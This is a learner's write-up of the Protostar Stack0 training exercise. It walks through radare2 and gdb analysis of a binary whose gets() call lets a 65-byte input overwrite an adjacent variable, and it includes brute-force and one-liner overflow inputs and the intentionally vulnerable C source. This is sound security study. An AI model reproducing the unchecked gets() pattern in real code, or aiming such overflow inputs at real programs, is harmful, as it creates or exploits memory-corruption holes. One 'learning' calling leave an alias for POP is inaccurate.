# Protostar Stack0
## Write-up
 - [x] Static Analysis - identify what C APIs were used
 - [x] Run the vulnerable code and write a Brute Force script
 - [x] Attach a Debugger, to inspect variables at run-time what was happening
 - [x] Read the Code to verify results
 - [x] Summary

## Static Analysis
##### Open and analyse the binary
`r2 -A stack0`
##### Familiarity
```
[0x1000015f0]> i
file     stack0
format   elf
type     EXEC (Executable file)
arch     x86
canary   false
crypto   false
endian   little
lang     c
os       linux
pic      false
static   false
stripped false
.....
```
##### Imports
```
[0x080483f4]> ii
[Imports]
   1 0x080482fc    WEAK  NOTYPE __gmon_start__
   2 0x0804830c  GLOBAL    FUNC gets
   3 0x0804831c  GLOBAL    FUNC __libc_start_main
   4 0x0804832c  GLOBAL    FUNC puts
```

#####  gets
`man gets` tells you:


> The gets() function cannot be used securely.  Because
>      of its lack of bounds checking, and the inability for
>      the calling program to reliably determine the length
>      of the next incoming line, the use of this function
>      enables malicious users to arbitrarily change a run-
>      ning program's functionality through a buffer over-
>      flow attack.

##### Exports
```
[0x08048340]> iE
066 0x000003f4 0x080483f4 GLOBAL   FUNC   65 main
```
##### Look for interesting Strings
```
fs strings; f
0x08048500 41 str.you_have_changed_the__modified__variable
0x08048529 11 str.Try_again
```
##### Print disassembled function
```
[0x08048340]> pdf @0x080483f4
/ (fcn) main 65
|   main ();
|           ; var char *s @ esp+0x1c
|           ; var int local_5ch @ esp+0x5c
|           ; DATA XREF from entry0 (0x8048357)
|           0x080483f4      55             push ebp
|           0x080483f5      89e5           mov ebp, esp
|           0x080483f7      83e4f0         and esp, 0xfffffff0
|           0x080483fa      83ec60         sub esp, 0x60               ; '`'
|           0x080483fd      c744245c0000.  mov dword [local_5ch], 0
|           0x08048405      8d44241c       lea eax, [s]                ; 0x1c ; 28
|           0x08048409      890424         mov dword [esp], eax        ; char *s
|           0x0804840c      e8fbfeffff     call sym.imp.gets           ; char *gets(char *s)
|           0x08048411      8b44245c       mov eax, dword [local_5ch]  ; [0x5c:4]=-1 ; '\' ; 92
|           0x08048415      85c0           test eax, eax
|       ,=< 0x08048417      740e           je 0x8048427
|       |   0x08048419      c70424008504.  mov dword [esp], str.you_have_changed_the__modified__variable ; [0x8048500:4]=0x20756f79 ; "you have changed the 'modified' variable" ; const char *s
|       |   0x08048420      e807ffffff     call sym.imp.puts           ; int puts(const char *s)
|      ,==< 0x08048425      eb0c           jmp 0x8048433
|      ||   ; CODE XREF from main (0x8048417)
|      |`-> 0x08048427      c70424298504.  mov dword [esp], str.Try_again ; [0x8048529:4]=0x20797254 ; "Try again?" ; const char *s
|      |    0x0804842e      e8f9feffff     call sym.imp.puts           ; int puts(const char *s)
|      |    ; CODE XREF from main (0x8048425)
|      `--> 0x08048433      c9             leave
\           0x08048434      c3             ret
```

## Run vulnerable code
```
$ ./stack0      
ss
Try again?
```
## Brute Force vulnerable code
```
#!/bin/bash
for i in {1..70}
do
 seq -sA $i|tr -d '[:digit:]' | ./stack0
done
```
### Use codetools
```
$ perl -e 'print "A"x65'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | /opt/protostar/bin/stack0
you have changed the 'modified' variable

$ python -c 'print "A"*(64)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ python -c 'print "A"*(64)' | /opt/protostar/bin/stack0
Try again?

$ python -c 'print "A"*(65)' | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

##### Start debugger
```
(gdb) set disassembly-flavor intel

(gdb) file stack0
Reading symbols from /opt/protostar/bin/stack0...done.


(gdb) disas main
Dump of assembler code for function main:
0x08048411 <main+29>:	mov    0x5c(%esp),%eax

(gdb) r

(gdb) frame
#0  _IO_puts (str=0x8048529 "Try again?") at ioputs.c:37
37	in ioputs.c

```
##### Breakpoint
```

(gdb) b puts
Breakpoint 1 at 0xb7ef4789: file ioputs.c, line 37.

(gdb) c

(gdb) info locals
modified = 0
buffer = "\377\377\377\377\364\357\377\267K\202\004\b\001\000\000\000 \375\377\277&\006\377\267\260\372\377\267(\033\376\267\364\177\375\267\000\000\000\000\000\000\000\000\070\375\377\277i\317\330\301y9\231\353\000\000\000\000\000\000\000"


(gdb) info proc mappings
process 1581
cmdline = '/opt/protostar/bin/stack0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack0'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack0
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack0
	.............
	.............
	0xbffeb000 0xc0000000    0x15000          0           [stack]

```

##### Script on Breakpoint
```
0x0804840c <main+24>:	call   0x804830c <gets@plt>
(gdb) b *0x0804840c
Breakpoint 5 at 0x804840c: file stack0/stack0.c, line 11.

0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
(gdb) b *0x08048411
Breakpoint 6 at 0x8048411: file stack0/stack0.c, line 13.


(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $esp
>x/2i $eip
>end
```
##### Watch Stack values change
```
(gdb) c
Continuing.
AAAAAAAAAA
eax            0xbffffc6c	-1073742740
ecx            0xbffffc6c	-1073742740
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc50	0xbffffc50
ebp            0xbffffcb8	0xbffffcb8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x41414141
0xbffffc70:	0x41414141	0x08004141	0xbffffc88	0x080482e8
0xbffffc80:	0xb7ff1040	0x08049620	0xbffffcb8	0x08048469
0xbffffc90:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffffcb8
0xbffffca0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
---Type <return> to continue, or q <return> to quit---


(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
eax            0xbffffc6c	-1073742740
ecx            0xbffffc6c	-1073742740
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc50	0xbffffc50
ebp            0xbffffcb8	0xbffffcb8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x41414141
0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffca0:	0x41414141	0x41414141	0x41414141	0x00000041

```


## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}

```
## Summary
Although I wanted to use `gets` and a `[ Stack ] Buffer Overflow`, you could patch out the "test' instruction with a static disassembler or at run-time with a debugger.

##### Learnings
 - [x] Compiler optimisation -> the compiler replaced `printf` with `puts`
 - [x] c `volatile` keyword -> tells the Compiler not to Optimise away the variable
 - [x] X86 -> `test` instruction performs a bitwise AND on two operands.
 - [x] X86 -> `leave` is the opposite of setting up the stack. It is an alias for POP.

##### Appendix - Convert Hex to Decimal
```
$ printf "%02X\n" 65
41

$ printf "%d\n" 0x5C
92
```
